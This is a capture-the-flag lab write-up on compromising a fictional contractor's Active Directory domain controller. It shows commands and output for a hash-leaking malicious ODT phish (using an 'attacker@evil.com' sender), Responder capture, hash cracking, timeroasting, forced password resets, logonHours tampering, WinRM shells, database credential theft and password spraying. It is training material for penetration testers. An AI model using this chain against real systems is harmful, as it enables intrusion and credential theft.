# HSM Defense — Hack Smarter Labs Writeup

## Scenario

HSM Defense is a defense contractor requiring an in-depth penetration test against their internal Domain Controller. The objective is to demonstrate impact by elevating privileges to Domain Admin.

**Provided credentials:** `kelly.johnson:Lordofwar`

---

## Note

we will accept the challenge and start the machine as blackbox with no credentials

---

## 1. Reconnaissance & Enumeration

### Port Scanning

The target DC (`DC.hsm-defense.local` — `10.1.87.19`) exposes the following services:
```
PORT      STATE SERVICE       REASON  VERSION

25/tcp    open  smtp          syn-ack hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

53/tcp    open  domain        syn-ack Simple DNS Plus

80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Office Careers | HSM Defense
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

110/tcp   open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP

135/tcp   open  msrpc         syn-ack Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn

143/tcp   open  imap          syn-ack hMailServer imapd
|_imap-capabilities: completed OK SORT IMAP4 IMAP4rev1 RIGHTS=texkA0001 NAMESPACE QUOTA ACL CAPABILITY IDLE CHILDREN

445/tcp   open  microsoft-ds? syn-ack

587/tcp   open  smtp          syn-ack hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hsm-defense.local
| Issuer: commonName=DC.hsm-defense.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-31T17:16:05
| Not valid after:  2027-03-02T17:16:05
| MD5:   0242:3db7:4cd0:fa91:dd6f:dd0e:c00e:0244
| SHA-1: d4a1:bb1f:dbbc:2597:184d:86a9:92e3:b6c4:f1c3:b550
| -----BEGIN CERTIFICATE-----
| MIIC7DCCAdSgAwIBAgIQGcHLgRZHMI5LXk0IBE3OmDANBgkqhkiG9w0BAQsFADAf
| MR0wGwYDVQQDExREQy5oc20tZGVmZW5zZS5sb2NhbDAeFw0yNjA4MzExNzE2MDVa
| Fw0yNzAzMDIxNzE2MDVaMB8xHTAbBgNVBAMTFERDLmhzbS1kZWZlbnNlLmxvY2Fs
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtAu/bLFbw561L+AZz9jX
| 9Y7cGkMG9gLojw49vpnXNhbRSdic+s7lA7EiNHB91RhRdv8hal9ywdqR1ADD3vxV
| EVxjE3HWYzKkhuS6wxsheyKfG2k9P9yvHwGRruv/SL69LUJF81NQ7Zyrqcyaqfid
| pDNv80RKFKnbMeEA6SkdoV7Zidd2PRoTsSzH1JmeBmUCjPN8hAXi9zSQVYTM7qs9
| MVpNXu0gQYuEQYb5N/ElJVMvghCADpyaGdbA9Byg4JdwrcfAsdokRXF23GG+VFmV
| ANuQevZTyyLLXW/S2q0kDX+MVVxR3lvWKMziWTwKyHJGJw7U1ijqkcm5QnoLQBhq
| jQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJ
| KoZIhvcNAQELBQADggEBAF0F/PdbCkxFSetU95r4X0OEAu41x8U86nXZDty3Ffk9
| Il4taU0Ffgmra9Rwb//xbKXMwURQfR0jeepLtCs+j6D0AVGZC1gDvO0wej5yXr88
| VzsL+nfD/51nmcpmM173a3ZKrL01c05kEJOYb/DSIqBQERAAbwX4NriaTUTzf0ok
| EybAr4YcNx/3udbn6mGwS5vmrJWr5lSJkq9ECe2HdEbXkhb0z+8t75ROjGXPyZcn
| TTtEZZWOGej7wtCA1vOTKiejWPjM1WBOJBlCwp+2Ej5Hrw4QAgtZdeUuz7Q1uPDK
| sROEd6eWuJp+hFhAaO+UUj92HJwK0qbMHlQ28mFFKLI=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-09-17T19:17:41+00:00; -1s from scanner time.

5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-17T19:17:32
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41331/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33689/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37083/udp): CLEAN (Timeout)
|   Check 4 (port 17349/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 17 20:17:48 2026 -- 1 IP address (1 host up) scanned in 172.77 seconds
```

### SMB Enumeration

Since NTLM authentication is disabled on the DC, all authentication must use Kerberos. We generate the necessary hosts file entry and `krb5.conf`:

```
nxc smb 10.1.87.19 -u guest -p '' --generate-hosts-file hsm-defense-host
nxc smb DC.hsm-defense.local -u 'guest' -p '' --generate-krb5-file /etc/krb5.conf -k
```

Add to `/etc/hosts`:

```
10.1.87.19 DC.hsm-defense.local hsm-defense.local DC
```

### Web Enumeration

A VHOST fuzz discovers `support.hsm-defense.local`:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.hsm-defense.local" -u http://hsm-defense.local -fw 23339
```

The careers portal invites applications via `careers@hsm-defense.local` in **ODT/ODP format** — a classic phishing vector.

---

## 2. Initial Access — Phishing with Malicious ODT

### Crafting the Payload

Using this python scripts `badodt.py` `https://github.com/rmdavy/badodf/blob/master/badodt.py` , we generate an ODT file that forces an outbound SMB connection when opened:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ python3 badodt.py 
/home/donmed/LAB/Hacksmarter/Defense/badodt.py:13: SyntaxWarning: invalid escape sequence '\/'
  / __ )____ _____/ /     / __ \/ __ \/ ____/

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
Python3 version by @gustanini
www.secureyourit.co.uk


Please enter IP of listener: 10.200.96.99
/home/donmed/LAB/Hacksmarter/Defense/bad.odt successfully created

```

### Setting Up Responder

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ sudo responder -I tun0
[sudo] password for donmed: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.200.96.99]
    Responder IPv6             [fe80::b863:9d1f:d00a:ac25]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-1NL3TWE6ZTT]
    Responder Domain Name      [NS8W.LOCAL]
    Responder DCE-RPC Port     [48308]

[+] Listening for events...

[*] Skipping previously captured hash for HSMDEFENSE\kelly.johnson

```

### Delivering the Phish

```
swaks --to 'careers@hsm-defense.local' --from 'attacker@evil.com' \
  --attach @bad.odt --server 10.1.87.19:25
```

When `kelly.johnson` opens the document, her machine authenticates to our SMB share, leaking an **NTLMv2 hash** that we crack with hashcat:

```
hashcat -m 5600 kelly.hash /usr/share/wordlists/rockyou.txt
```

**Cracked:** `kelly.johnson:Lordofwar`

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ nxc smb 10.1.212.125 -u kelly.johnson -p Lordofwar -k 
SMB         10.1.212.125    445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.1.212.125    445    DC               [+] hsm-defense.local\kelly.johnson:Lordofwar

```

---

## 3. Domain Enumeration with BloodHound

```
nxc ldap hsm-defense.local -u kelly.johnson -p Lordofwar -k --bloodhound --collection all --dns-server 10.1.212.125
```

Key findings:

- `kelly.johnson` is a member of **`it-ticket-handlers`**


<img width="1154" height="593" alt="image" src="https://github.com/user-attachments/assets/1850df11-cd61-4e15-ad4d-f47e31ef34f5" />

- The only Domain Admin is **Administrator**
  
<img width="900" height="336" alt="image" src="https://github.com/user-attachments/assets/d12051d6-8ad1-4fb4-9e1d-cbb51262cea4" />

---

## 4. Support Portal Access

Using `kelly.johnson` credentials, we log into `http://support.hsm-defense.local/`. The portal contains tickets with sensitive information:

- **Ticket 2417:** A password was manually set on the `HELPDESK01$` machine account
- 
<img width="1509" height="682" alt="image" src="https://github.com/user-attachments/assets/79e353fe-62fc-4a48-af62-4d063498c354" />

- **Ticket 2422:** `jason.caldwell` is locked out (`KDC_ERR_CLIENT_REVOKED`) due to incorrectly configured logon hours
  
<img width="1514" height="634" alt="image" src="https://github.com/user-attachments/assets/c2bf333c-1b5c-4949-a456-d446f6e1e044" />


---

## 5. Timeroasting — Extracting Machine Account Hashes

Ticket 2417 reveals `HELPDESK01$` has a manually-set password — likely weak and crackable.

Timeroasting abuses Microsoft's proprietary NTP extension to extract password-equivalent hashes without authentication:

```
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ nxc smb DC.hsm-defense.local -u kelly.johnson -p Lordofwar -k -M timeroast
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\kelly.johnson:Lordofwar 
TIMEROAST   DC.hsm-defense.local 445    DC               [*] Starting Timeroasting...
TIMEROAST   DC.hsm-defense.local 445    DC               1000:$sntp-ms$152708e2d63f966b7efe57d016151f51$1c0111e900000000000a02d44c4f434cee5a8ac715fdb31ee1b8428bffbfcd0aee5a8e82ce0deb7bee5a8e82ce0e2ce9
TIMEROAST   DC.hsm-defense.local 445    DC               1105:$sntp-ms$1dd6ac2716217440b4da4865eb396a55$1c0111e900000000000a02d54c4f434cee5a8ac71478c50de1b8428bffbfcd0aee5a8e837478a6daee5a8e837478d5d4
TIMEROAST   DC.hsm-defense.local 445    DC               1122:$sntp-ms$4e80e23be3c1df7cca0dbeb8235c83ae$1c0111e900000000000a02d54c4f434cee5a8ac71648c56be1b8428bffbfcd0aee5a8e838a406a53ee5a8e838a40ad6f

```

This returns three SNTP hashes. We crack them with hashcat mode **31300**:

```
hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt
```

**Cracked:** `HELPDESK01$:<password>`

---

## 6. ServiceDesk Group Takeover

BloodHound reveals `HELPDESK01$` has **WriteOwner** on the `servicedesk` group. 

<img width="753" height="372" alt="image" src="https://github.com/user-attachments/assets/a0929d8b-31a7-4d72-92d8-a05c86291341" />

The `servicedesk` group has **ForceChangePassword** over `jason.caldwell`, `ethan.mercer`, and `luke.harrison`.

<img width="1024" height="591" alt="image" src="https://github.com/user-attachments/assets/a492c156-d11f-4ade-8de1-21e45f21330d" />


### Step 1: Set Ownership

```
1. First generate the ST of HELPDESK01$

┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ impacket-getTGT 'hsm-defense.local/HELPDESK01$:Password123' -dc-ip 10.1.212.125
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

2. Export the Ticket

[*] Saving ticket in HELPDESK01$.ccache
┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=HELPDESK01$.ccache

3. take the ownership of SERVERDESK group

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' set owner 'servicedesk' 'HELPDESK01$'

```

### Step 2: Grant GenericAll

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' add genericAll 'servicedesk' 'HELPDESK01$'
```

### Step 3: Add Machine Account to Group

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' add groupMember 'servicedesk' 'HELPDESK01$'
```

### Step 4: Reset Passwords of `jason.caldwell`, `ethan.mercer`, and `luke.harrison`.

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' set password jason.caldwell 'Pwned123@!'
```

Authentication as `jason.caldwell` fails with `KDC_ERR_CLIENT_REVOKED` — exactly as Ticket 2422 described. We pivot to `luke.harrison`.

---

## 7. Access as luke.harrison — LogonHours Manipulation

```

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' set password luke.harrison 'Pwned123@!'

```

Authentication succeeds. Now we enumerate writable objects:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ 
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ impacket-getTGT 'hsm-defense.local/luke.harrison:NewPass123!' -dc-ip 10.1.212.125
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in luke.harrison.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=luke.harrison.ccache 
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hsm-defense,DC=local
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Luke Harrison,CN=Users,DC=hsm-defense,DC=local
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
logonHours: WRITE <------ HERE

distinguishedName: DC=hsm-defense.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hsm-defense,DC=local
dnsNode: CREATE_CHILD  
dnsZoneScopeContainer: CREATE_CHILD

distinguishedName: DC=_msdcs.hsm-defense.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hsm-defense,DC=local
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD


```

**Key finding:** `luke.harrison` has **WriteProperty** on `jason.caldwell`'s `logonHours` attribute — a relationship not visible in BloodHound.

### Clear the LogonHours Restriction

```

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' set object jason.caldwell logonHours

```

Now `jason.caldwell` can authenticate:

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ nxc smb -k DC.hsm-defense.local -u 'jason.caldwell' -p 'NewPass123!' --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\jason.caldwell:NewPass123!

```

### WinRM Shell as jason.caldwell

<img width="645" height="324" alt="image" src="https://github.com/user-attachments/assets/59195281-6c22-4169-90b0-5d6791aff701" />


```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ getTGT.py hsm-defense.local/jason.caldwell:'NewPass123!'
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jason.caldwell.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=jason.caldwell.ccache 
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD]─[10.200.96.99]
└──╼ $ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> 

```

---

## 8. MariaDB Credential Discovery

On the DC, MariaDB runs internally on port **3306**:

<img width="1260" height="774" alt="image" src="https://github.com/user-attachments/assets/66c23938-5eb4-4237-bea0-1d45b2390fab" />


The installation folder is `C:\Program Files\MariaDB 10.6`. Reading `my.ini` reveals database credentials:

```

*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> type "C:\Program Files\MariaDB 10.6\data\my.ini"
 
[mysqld]
datadir=C:/Program Files/MariaDB 10.6/data
port=3306
bind-address=127.0.0.1
innodb_buffer_pool_size=511M

[client]
port=3306
plugin-dir=C:\Program Files\MariaDB 10.6/lib/plugin

[internal_app]
database_host=127.0.0.1
database_user=root
database_password=pa$$w0rd12

```

Enumerate the `new_employees` database:

```
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> & "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -p'pa$$w0rd12' -e "SHOW DATABASES;"
Database
hsm_defense
information_schema
mysql
new_employees
performance_schema
sys
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> & "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -p'pa$$w0rd12' -D new_employees -e "SELECT * FROM employees;"
id	username	password
1	aaron.pierce	d482a055616317f569cd1ab90325479e
2	nathan.reed	d482a055616317f569cd1ab90325479e
4	adam.brooks	f3a4f28a0aaf388c0ce16a6011acf511
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> 

```

Three **MD5 hashes** are recovered. Cracking one that appears twice:

```
hashcat -a0 -m0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 9. Password Spraying — Access as caleb.turner

Spray the cracked password across domain users:

```
nxc smb -k DC.hsm-defense.local -u valid_users.txt -p '//newpassword123' --continue-on-success | grep '\[+\]'
SMB                      DC.hsm-defense.local 445    DC               [+] hsm-defense.local\aaron.pierce://newpassword123 
SMB                      DC.hsm-defense.local 445    DC               [+] hsm-defense.local\caleb.turner://newpassword123

```

**Two hits:** `aaron.pierce` and `caleb.turner`

BloodHound shows `caleb.turner` is a member of **Remote Management Users** and **IT OU Operators**.

<img width="714" height="505" alt="image" src="https://github.com/user-attachments/assets/1461c2ca-b6b3-4bc6-a56f-33f66cbc028f" />


### WinRM Shell as caleb.turner

```

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ getTGT.py hsm-defense.local/caleb.turner:'//newpassword123'
Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in caleb.turner.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ export KRB5CCNAME=caleb.turner.ccache
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\caleb.turner\Documents>

```

**User flag found:** `C:\Users\caleb.turner\Desktop\user.txt`

```
(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\caleb.turner\Documents> cat ../Desktop/user.txt

FLAG{$flag}


⠀⠀⠀⣠⣴⠶⠶⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⢟⡵⠿⣿⣷⡄⢻⡶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⢣⣿⣿⣶⣌⣙⡇⣸⠻⣎⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠸⡍⠻⣿⣿⠟⣰⣇⠀⢄⠑⢈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⢦⣈⣉⣉⣴⡞⠁⠀⠁⠐⢿⣾⣯⠻⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠯⣝⡻⠦⡄⠈⣢⣾⣿⡿⠀⠀⠙⢦⡀⢀⣀⣀⣀⣠⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠓⠚⠛⠿⣿⣿⣥⡀⠀⠀⠀⠙⢯⣭⣤⣤⣤⣤⣤⣄⠀⣽⢉⠓⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣌⠒⢤⡠⣀⠀⢹⣿⡌⠈⠉⠋⡇⠀⡇⣸⠙⠓⠦⣍⣓⣦⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣦⣉⣂⣑⣶⡟⢡⠀⠀⢸⠁⢰⣃⣟⣄⣀⣀⣐⣻⡼⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣠⣿⣩⣿⣿⣏⣉⣭⣥⡤⣧⡶⠒⠛⠛⠛⠛⣿⡟⠿⠿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠞⡩⡉⢁⠀⣼⣣⠟⠉⠁⠀⡀⠀⠀⣴⢋⣦⠎⢀⣠⡶⠛⣡⢿⡶⠦⣤⣈⡙⠻⢦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⡧⠾⠿⣷⣿⣿⡿⢁⠎⣠⢀⣾⣀⣀⣞⣿⠭⢭⣭⢿⣿⣷⢾⣧⡾⠿⠷⢾⡯⣍⣳⡦⣌⡛⠦⣄⠀⠀
⠀⠀⠀⠀⠀⢨⣟⣋⣿⣏⣻⡿⢿⠋⠹⡉⢉⠉⠉⢏⢹⡿⡾⣶⣿⡾⣿⢷⣿⡏⣴⣿⣿⣦⢻⣶⣬⣹⣶⣿⡳⣌⢻⡆
⠀⠀⠀⠀⠀⠈⢯⡈⣏⣯⣆⢹⣼⣧⠀⡄⠀⢻⣆⠀⢀⢻⣄⣸⣹⣇⣸⣦⣿⡆⢿⣷⣾⡟⣸⠛⣿⣻⣿⣿⣿⣾⠻⣇
